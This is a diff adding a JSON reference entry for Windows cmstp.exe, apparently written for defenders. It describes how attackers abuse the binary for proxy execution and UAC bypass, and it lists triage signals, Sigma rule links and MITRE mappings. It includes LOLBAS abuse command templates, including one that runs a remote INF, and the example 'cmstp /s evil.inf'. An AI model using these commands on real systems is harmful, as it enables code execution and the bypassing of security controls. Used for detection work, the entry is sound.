@@ -1,0 +1,255 @@
+{
+  "name": "cmstp.exe",
+  "aliases": [
+    "cmstp"
+  ],
+  "category": "Utility",
+  "tags": [
+    "microsoft",
+    "core-windows",
+    "lolbin"
+  ],
+  "description": "cmstp.exe is the Connection Manager Profile Installer, meant to install network connection profiles from an INF file. It is rarely used today. Attackers abuse it to run commands through a signed Microsoft binary and to bypass User Account Control, driven entirely by a crafted INF.\n",
+  "about": "cmstp.exe installs or removes Connection Manager service profiles described in an INF file. An INF can specify scriptable actions that run during installation, and that is the mechanism attackers repurpose: a crafted INF tells cmstp to fetch and run a command or scriptlet. The genuine binary lives at `C:\\Windows\\System32\\cmstp.exe`, with a 32-bit copy under `SysWOW64`.\n\nLegitimately, cmstp is used to deploy VPN or dial-up connection profiles, which is uncommon on modern systems. The INF it is given, and where that INF came from, are what give an instance meaning.\n",
+  "publisher": null,
+  "issuer": null,
+  "signed": null,
+  "signing_rate": null,
+  "signing_algorithm": null,
+  "signers": [],
+  "file_details": null,
+  "file_versions": [],
+  "file_sizes": [],
+  "cert_thumbprints": [],
+  "provenance": "curated",
+  "prevalence_band": "unknown",
+  "prevalence_score": null,
+  "host_prevalence": null,
+  "execution_rank": null,
+  "community_score": null,
+  "first_seen": null,
+  "last_seen": null,
+  "machine_count": null,
+  "execution_count": null,
+  "expected_paths": [],
+  "expected_parents": [],
+  "expected_children": [],
+  "expected_grandparents": [],
+  "expected_grandchildren": [],
+  "network_ports": [],
+  "listening_ports": [],
+  "network_destinations": [],
+  "loaded_modules": [],
+  "named_pipes": [],
+  "user_contexts": [],
+  "integrity_levels": [],
+  "sessions": [],
+  "instance_counts": [],
+  "token_privileges": [],
+  "process_handles": [],
+  "os_prevalence": [],
+  "anomaly_signals": [
+    {
+      "signal": "An INF on the command line from a user-writable path or a remote location",
+      "severity": "high"
+    },
+    {
+      "signal": "Parent is an Office application, a script host, `cmd.exe`, or `powershell.exe`",
+      "severity": "high"
+    },
+    {
+      "signal": "cmstp spawning a shell or making outbound network connections",
+      "severity": "high"
+    },
+    {
+      "signal": "Run on a host that does not deploy connection profiles",
+      "severity": "medium"
+    }
+  ],
+  "command_lines": [],
+  "known_hashes": [],
+  "security_notes": "cmstp.exe is a system-binary proxy (T1218.003). A crafted INF makes the signed binary execute an embedded or remote command or scriptlet, so an attacker runs `cmstp /s evil.inf` to have a trusted Microsoft process run their code, bypassing application-control rules. The same INF mechanism is used to bypass User Account Control, because cmstp can run an action auto-elevated without the usual prompt.\n\nConnection-profile installation is rare, so cmstp running at all is notable, and an INF from a temp, download, or remote path, or a parent like an Office application, marks it as abuse rather than network configuration.\n",
+  "mitre_attack": [
+    "T1218.003"
+  ],
+  "technique_matching": "strict",
+  "references": [
+    "https://lolbas-project.github.io/lolbas/Binaries/Cmstp/",
+    "https://attack.mitre.org/techniques/T1218/003/"
+  ],
+  "lolbas": {
+    "url": "https://lolbas-project.github.io/lolbas/Binaries/Cmstp/",
+    "commands": [
+      {
+        "command": "cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}",
+        "usecase": "Execute code hidden within an inf file. Download and run scriptlets from internet.",
+        "mitreID": "T1218.003",
+        "category": "Execute"
+      },
+      {
+        "command": "cmstp.exe /ni /s {REMOTEURL:.inf}",
+        "usecase": "Execute code hidden within an inf file. Execute code directly from Internet.",
+        "mitreID": "T1218.003",
+        "category": "AWL Bypass"
+      },
+      {
+        "command": "cmstp.exe /nf",
+        "usecase": "Proxy execution of a malicious DLL via registry modification.",
+        "mitreID": "T1218.003",
+        "category": "Execute"
+      }
+    ]
+  },
+  "sigma": [
+    {
+      "id": "e66779cc-383e-4224-a3a4-267eeb585c40",
+      "title": "Bypass UAC via CMSTP",
+      "level": "high",
+      "techniques": [
+        "T1548.002",
+        "T1218.003"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_uac_bypass_cmstp.yml",
+      "match": "image"
+    },
+    {
+      "id": "7d4cdc5a-0076-40ca-aac8-f7e714570e47",
+      "title": "CMSTP Execution Process Creation",
+      "level": "high",
+      "techniques": [
+        "T1218.003"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmstp_execution_by_creation.yml",
+      "match": "parent"
+    },
+    {
+      "id": "75e508f7-932d-4ebc-af77-269237a84ce1",
+      "title": "DLL Loaded From Suspicious Location Via Cmspt.EXE",
+      "level": "high",
+      "techniques": [
+        "T1218.003"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/image_load/image_load_cmstp_load_dll_from_susp_location.yml",
+      "match": "image"
+    },
+    {
+      "id": "4508a70e-97ef-4300-b62b-ff27992990ea",
+      "title": "DotNet CLR DLL Loaded By Scripting Applications",
+      "level": "high",
+      "techniques": [
+        "T1055"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/image_load/image_load_susp_script_dotnet_clr_dll_load.yml",
+      "match": "image"
+    },
+    {
+      "id": "0ba1da6d-b6ce-4366-828c-18826c9de23e",
+      "title": "Potential Defense Evasion Via Rename Of Highly Relevant Binaries",
+      "level": "high",
+      "techniques": [
+        "T1036.003"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_renamed_binary_highly_relevant.yml",
+      "match": "image"
+    },
+    {
+      "id": "438025f9-5856-4663-83f7-52f878a70a50",
+      "title": "Suspicious Microsoft Office Child Process",
+      "level": "high",
+      "techniques": [
+        "T1047",
+        "T1204.002",
+        "T1218.010"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_office_susp_child_processes.yml",
+      "match": "image"
+    },
+    {
+      "id": "c27515df-97a9-4162-8a60-dc0eeb51b775",
+      "title": "Suspicious Microsoft OneNote Child Process",
+      "level": "high",
+      "techniques": [
+        "T1566",
+        "T1566.001"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_office_onenote_susp_child_processes.yml",
+      "match": "image"
+    },
+    {
+      "id": "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+      "title": "System File Execution Location Anomaly",
+      "level": "high",
+      "techniques": [
+        "T1036"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_system_exe_anomaly.yml",
+      "match": "image"
+    },
+    {
+      "id": "d4ca7c59-e9e4-42d8-bf57-91a776efcb87",
+      "title": "LOLBIN Execution From Abnormal Drive",
+      "level": "medium",
+      "techniques": [],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_lolbin_exec_from_non_c_drive.yml",
+      "match": "image"
+    }
+  ],
+  "techniques": [
+    {
+      "id": "T1218.003",
+      "name": "System Binary Proxy Execution: CMSTP",
+      "curated": true,
+      "lolbas": true,
+      "groups": [
+        {
+          "id": "G0080",
+          "name": "Cobalt Group"
+        },
+        {
+          "id": "G0069",
+          "name": "MuddyWater"
+        }
+      ],
+      "software": [
+        {
+          "id": "S1149",
+          "name": "CHIMNEYSWEEP"
+        }
+      ],
+      "tactics": [
+        {
+          "name": "Stealth",
+          "order": 6
+        }
+      ]
+    }
+  ],
+  "triage": [
+    {
+      "signal": "An INF on the command line from a user-writable path or a remote location",
+      "severity": "high",
+      "source": "curated",
+      "signalHtml": "An INF on the command line from a user-writable path or a remote location"
+    },
+    {
+      "signal": "Parent is an Office application, a script host, `cmd.exe`, or `powershell.exe`",
+      "severity": "high",
+      "source": "curated",
+      "signalHtml": "Parent is an Office application, a script host, <a class=\"proc-link\" href=\"/processes/cmd.exe\"><code>cmd.exe</code></a>, or <a class=\"proc-link\" href=\"/processes/powershell.exe\"><code>powershell.exe</code></a>"
+    },
+    {
+      "signal": "cmstp spawning a shell or making outbound network connections",
+      "severity": "high",
+      "source": "curated",
+      "signalHtml": "cmstp spawning a shell or making outbound network connections"
+    },
+    {
+      "signal": "Run on a host that does not deploy connection profiles",
+      "severity": "medium",
+      "source": "curated",
+      "signalHtml": "Run on a host that does not deploy connection profiles"
+    }
+  ],
+  "about_html": "<p>cmstp.exe installs or removes Connection Manager service profiles described in an INF file. An INF can specify scriptable actions that run during installation, and that is the mechanism attackers repurpose: a crafted INF tells cmstp to fetch and run a command or scriptlet. The genuine binary lives at <code>C:\\Windows\\System32\\cmstp.exe</code>, with a 32-bit copy under <code>SysWOW64</code>.</p>\n<p>Legitimately, cmstp is used to deploy VPN or dial-up connection profiles, which is uncommon on modern systems. The INF it is given, and where that INF came from, are what give an instance meaning.</p>",
+  "security_notes_html": "<p>cmstp.exe is a system-binary proxy (<a href=\"https://attack.mitre.org/techniques/T1218/003/\" target=\"_blank\" rel=\"noreferrer noopener\">T1218.003</a>). A crafted INF makes the signed binary execute an embedded or remote command or scriptlet, so an attacker runs <code>cmstp /s evil.inf</code> to have a trusted Microsoft process run their code, bypassing application-control rules. The same INF mechanism is used to bypass User Account Control, because cmstp can run an action auto-elevated without the usual prompt.</p>\n<p>Connection-profile installation is rare, so cmstp running at all is notable, and an INF from a temp, download, or remote path, or a parent like an Office application, marks it as abuse rather than network configuration.</p>"
+}
